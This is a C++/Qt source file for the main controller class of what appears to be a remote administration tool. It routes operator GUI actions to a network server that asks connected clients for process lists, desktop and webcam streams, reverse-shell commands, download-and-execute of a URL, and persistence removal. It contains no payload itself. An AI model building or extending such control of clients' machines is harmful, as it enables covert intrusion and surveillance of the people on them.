#include "XeytanQpp.h"
#include "../ui/qt/MainGui.h"
#include <QDebug>
#include "concurrent/events/ui/GuiEvent.h"
#include <QTimer>
#include "concurrent/events/ui/MediaUiEvent.h"

QThread* mainThread;
QThread* appThread;


XeytanQpp::XeytanQpp(QObject* parent): QObject(parent)
{
	// With the current implementation this constructor is ran in the main thread
	// so it does not make sense to move the mediator to the main thread.
	// But I was playing with running this constructor in the background, this is why I wrote this code.
	// It does not hurt to keep it.
	mediator = new GuiMediator();
	mediator->moveToThread(mainThread);


	reporter = new Reporter;

	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId << ":"
		<< QThread::currentThread()->objectName();

	QTimer::singleShot(200, this, &XeytanQpp::onPingUiTimer);

	// Only meant for debugging
	connect(mediator, &GuiMediator::sendPingToApp, this, &XeytanQpp::recvPingFromUi);
	connect(this, &XeytanQpp::sendPingToUi, mediator, &GuiMediator::recvPingFromApp);
}

XeytanQpp::~XeytanQpp()
{
	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId << ":"
		<< QThread::currentThread()->objectName();
	qDebug() << "Exited";
	appThread->quit();
	appThread->wait();
}

// Static method, this is the App Launcher
QSharedPointer<XeytanQpp> XeytanQpp::launch()
{
	mainThread = QThread::currentThread();
	//mainThread = QApplication::instance()->thread();
	appThread = new QThread;

	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId << ":"
		<< QThread::currentThread()->objectName();
	auto xeytan = XeytanQpp::getInstance();

	// connect(appThread, &QThread::started, xeytan.get(), &XeytanQpp::run);
	connect(appThread, &QThread::finished, xeytan.get(), &XeytanQpp::onThreadFinished);
	connect(xeytan.get(), &XeytanQpp::appStarted, xeytan.get(), &XeytanQpp::run);

	// Move app to background Thread
	xeytan->moveToThread(appThread);
	// Start QThread message queue loop
	appThread->start();

	// We want to continue execution in the appThread so emit(queue) this signal from here(main thread)
	// to run XeytanQpp::run slot, since XeytanQpp was moved to appThread we will resume execution there.
	emit xeytan->appStarted();
	return xeytan;
}

QSharedPointer<XeytanQpp> XeytanQpp::getInstance()
{
	if (appInstance == nullptr)
		appInstance = QSharedPointer<XeytanQpp>(new XeytanQpp);
	return appInstance;
}

void XeytanQpp::onThreadFinished()
{
	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId << ":"
		<< QThread::currentThread()->objectName();
	qDebug() << "Finished Thread";
}

void XeytanQpp::recvNetClientEvent(const ClientNetEvent& event)
{
	// To speed up development I forward everything to the UiMediator, usually you don't wanna do that
	// The Ui components should not know how the Net subsystem works nor understand their models/data structures
	emit sendClientEventToUiMediator(event);
	if (event.eventType == NetEventType::PresentationData)
	{
	}
}

void XeytanQpp::receiveFromGui(const GuiEvent& event)
{
	// TODO: ideally I should emit signals to server instead of calling him but anyways... keep it simple for now
	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId << ":"
		<< QThread::currentThread()->objectName();

	UiEventAction action = event.getAction();
	qint64 clientId = event.getClientId();
	UiEventIntent intent = event.getIntent();
	UiWindow source = event.getSource();
	void* data = event.getData();

	// Q_ASSERT(action >= UiEventAction::MinFromUiMediator && action <= UiEventAction::MaxFromUiMediator);

	switch (source)
	{
	case UiWindow::MainWindow:
		{
			if (intent == UiEventIntent::InfoIntent)
				serverService->requestClientInfo(clientId);
			else if (intent == UiEventIntent::ProcessListIntent)
				serverService->requestClientProcessList(clientId);
			else if (intent == UiEventIntent::DesktopIntent)
			{
				if (action == UiEventAction::StartAction)
					serverService->requestDesktopConfiguration(clientId);
				else if (action == UiEventAction::StopAction)
					serverService->requestStopDesktopSession(clientId);
			}
			else if (intent == UiEventIntent::ConnectionIntent)
			{
				// do not use it, use the other slot
				Q_ASSERT(false);
			}
			else if (intent == UiEventIntent::ChatIntent)
			{
				if (action == UiEventAction::StartAction)
				{
					serverService->requestStartChat(clientId);
				}
				else if (action == UiEventAction::PushAction)
				{
					serverService->sendChatMessage(clientId, *((QString*)data));
				}
				else if (action == UiEventAction::CloseAction)
				{
					serverService->closeChat(clientId);
				}
			}
			else if (intent == UiEventIntent::DownloadAndExecute)
			{
				const QString url = *((QString*)data);
				serverService->requestDownloadAndExecute(clientId, url);
			}
			else if (intent == UiEventIntent::ReverseShellIntent)
			{
				if (action == UiEventAction::StartAction)
					serverService->requestStartReverseShell(clientId);
				else if (action == UiEventAction::UpdateAction)
					serverService->requestAddShellCommand(clientId, *((QString*)data));
				else if (action == UiEventAction::StopAction)
					serverService->requestStopReverseShell(clientId);
			}
			else if (intent == UiEventIntent::Persistence)
			{
				if (action == UiEventAction::StopAction)
				{
					serverService->requestUninstall(clientId);
				}
			}
			break;
		}
	case UiWindow::ReverseShellWindow:
		{
			if (action == UiEventAction::StartAction)
				serverService->requestStartReverseShell(clientId);
			else if (action == UiEventAction::UpdateAction)
				serverService->requestAddShellCommand(clientId, *((QString*)data));
			else if (action == UiEventAction::StopAction)
				serverService->requestStopReverseShell(clientId);
		}
	case UiWindow::ProcessListWindow:
		{
			break;
		}
	case UiWindow::DesktopWindow:
		{
			// Desktop window has been closed
			if (action == UiEventAction::StopAction)
				serverService->requestStopDesktopSession(clientId);
			else if (action == UiEventAction::PauseAction)
				serverService->requestPauseDesktopSession(clientId);

			break;
		}
	case UiWindow::CameraWindow:
		{
			if (action == UiEventAction::StopAction)
				serverService->requestStopCameraSession(clientId);

			break;
		}
	case UiWindow::ChatWindow:
		{
			if (action == UiEventAction::PushAction || action == UiEventAction::UpdateAction)
			{
				serverService->sendChatMessage(clientId, *((QString*)data));
			}
			else if (action == UiEventAction::StopAction)
			{
				serverService->closeChat(clientId);
			}
			break;
		default:
			return;
		}
	}
}

void XeytanQpp::receiveEventFromUiPtr(const QSharedPointer<GuiEvent>& event)
{
	const UiEventAction action = event->getAction();
	const qint64 clientId = event->getClientId();
	const UiEventIntent intent = event->getIntent();
	const UiWindow source = event->getSource();
	Q_ASSERT(action >= UiEventAction::MinFromUiMediator && action <= UiEventAction::MaxFromUiMediator);

	switch (source)
	{
	case UiWindow::MainWindow:
		{
			if (intent == UiEventIntent::InfoIntent)
				serverService->requestClientInfo(clientId);
			else if (intent == UiEventIntent::ProcessListIntent)
				serverService->requestClientProcessList(clientId);
			else if (intent == UiEventIntent::DesktopIntent)
			{
				if (action == UiEventAction::StartAction)
					serverService->requestDesktopConfiguration(clientId);
				else if (action == UiEventAction::StopAction)
					serverService->requestStopDesktopSession(clientId);
			}
			else if (intent == UiEventIntent::CameraIntent)
			{
				if (action == UiEventAction::StartAction)
					serverService->requestCameraConfiguration(clientId);
				else if (action == UiEventAction::StopAction)
					serverService->requestStopCameraSession(clientId);
			}
			else if (intent == UiEventIntent::ConnectionIntent)
			{
				if (action == UiEventAction::StopAction)
				{
					emit requestCloseClientConnection(clientId);
				}
			}
			break;
		}
	case UiWindow::CameraWindow:
		{
			const QSharedPointer<MediaUiEvent> cameraEvent = event.dynamicCast<MediaUiEvent>();
			if (action == UiEventAction::StartAction)
				serverService->requestStartCameraSession(clientId, cameraEvent->selectedDevice);
			break;
		}
	case UiWindow::DesktopWindow:
		{
			const QSharedPointer<MediaUiEvent> desktopEvent = event.dynamicCast<MediaUiEvent>();
			if (action == UiEventAction::StartAction)
				serverService->requestStartDesktopSession(clientId, desktopEvent->selectedDevice);

			break;
		}
	default:
		{
			qDebug() << "Unhandled UiPtr Event receiveEventFromUiPtr()";
		}
	}
}

// ENd usefule

void XeytanQpp::onClientDataReceivedPtr(QSharedPointer<ClientNetEvent> event)
{
	if (event->eventType == NetEventType::NewConnection)
	{
	}
}

void XeytanQpp::receiveNetEvent(const NetEvent& ev)
{
	if (ev.eventType == NetEventType::TestEvent)
	{
		qDebug() << "Received event successfully";
	}
}

void XeytanQpp::run()
{
	qDebug() << __FUNCTION__ " Running on Main Thread? " << (QThread::currentThread() == mainThread)
		<< " Current Thread Id:Name: " << QThread::currentThreadId() << ":"
		<< QThread::currentThread()->objectName();

	Q_ASSERT(QThread::currentThread() == appThread);
	Q_ASSERT(QThread::currentThread() != mainThread);

	bootstrapUiSubsystem();
	bootstrapNetSubsystem();
}


void XeytanQpp::bootstrapUiSubsystem()
{
	// We send Gui Events Through sendUiEventToMediator
	/*if (!connect(this, SIGNAL(sendUiEventToMediator(const GuiEvent&)), mediator,
				 SLOT(receiveEventFromApp(const GuiEvent&))))
		return;
	*/
	// Same as above but better intellisense in VS20017 <3

	if (!connect(this, &XeytanQpp::sendEventToUiMediator, mediator, &GuiMediator::receiveEventFromApp))
		return;

	if (!connect(this, &XeytanQpp::sendClientEventToUiMediator, mediator,
	             &GuiMediator::recvClientEventFromApp))
		return;

	// We receive events from gui in receiveFromGui
	if (!connect(mediator, &GuiMediator::sendToApp, this, &XeytanQpp::receiveFromGui))
		return;

	if (!connect(mediator, &GuiMediator::sendToAppPtr, this, &XeytanQpp::receiveEventFromUiPtr))
		return;


	// if (!connect(mediator, SIGNAL(sendToApp(const GuiEvent&)), this, SLOT(receiveFromGui(const GuiEvent&)))) return;


	// For debugging, hook into Thread Finished
	connect(appThread, &QThread::finished, this, &XeytanQpp::onThreadFinished);

	GuiEvent evt(UiWindow::MainWindow);
	evt.setAction(UiEventAction::ShowAction);
	emit sendEventToUiMediator(evt);
}


void XeytanQpp::bootstrapNetSubsystem()
{
	netThread = new QThread;
	serverService = QSharedPointer<NetServerService>(new NetServerService);

	serverService->set_reporter(*reporter);
	serverService->moveToThread(netThread);
	connect(netThread, &QThread::started, serverService.get(), &NetServerService::startService);
	connect(netThread, &QThread::finished, serverService.get(), &QObject::deleteLater);

	// connect(serverService, &NetServerService::clientDataReceived, this, &XeytanQpp::onClientDataReceived);
	connect(serverService.get(), &NetServerService::sendNetEventToApp, this, &XeytanQpp::receiveNetEvent);

	connect(this, &XeytanQpp::requestCloseClientConnection, serverService.get(),
	        &NetServerService::onRequestCloseClientConnection);

	if (!connect(serverService.get(), &NetServerService::clientDataReceivedPtr, this,
	             &XeytanQpp::onClientDataReceivedPtr))
		return;

	// A quick shortcut, instead of making a relay on XeytanQpp class
	// connect(serverService.get(), &NetServerService::sendNetClientEventToApp, this, &XeytanQpp::recvNetClientEvent);
	if (!connect(serverService.get(), &NetServerService::sendNetClientEventToApp, mediator,
	             &GuiMediator::recvClientEventFromApp))
		return;

	if (!connect(serverService.get(),
	             &NetServerService::sendNetClientEventToAppPtr, mediator,
	             &GuiMediator::recvClientEventFromAppPtr))
	{
		return;
	}

	// Some pings used to debug, sometimes for unexplained reasons signals/slots does not work ...
	connect(serverService.get(), &NetServerService::sendPingToApp, this, &XeytanQpp::recvPingFromNet);
	connect(this, &XeytanQpp::sendPingToNet, serverService.get(), &NetServerService::recvPingFromApp);

	netThread->start();
	QTimer::singleShot(200, this, &XeytanQpp::onPingNetTimer);
}


void XeytanQpp::onPingUiTimer()
{
	qDebug() << "[XeytanQpp] sending ping to Ui";
	emit sendPingToUi();
}

void XeytanQpp::onPingNetTimer()
{
	qDebug() << "[XeytanQpp] sending ping to Net";
	emit sendPingToNet();
}

void XeytanQpp::recvPingFromNet()
{
	qDebug() << "[XeytanQpp] ping received from Net";
}

void XeytanQpp::recvPingFromUi() const
{
	qDebug() << "[XeytanQpp] ping received from Ui";
}

void XeytanQpp::sendTestNetEvent()
{
	/*
	auto c = QSharedPointer<Client>(new Client);
	ClientNetEvent evt(NewConnection, c);
	emit sendClientEventToUiMediator(evt);
	*/
}
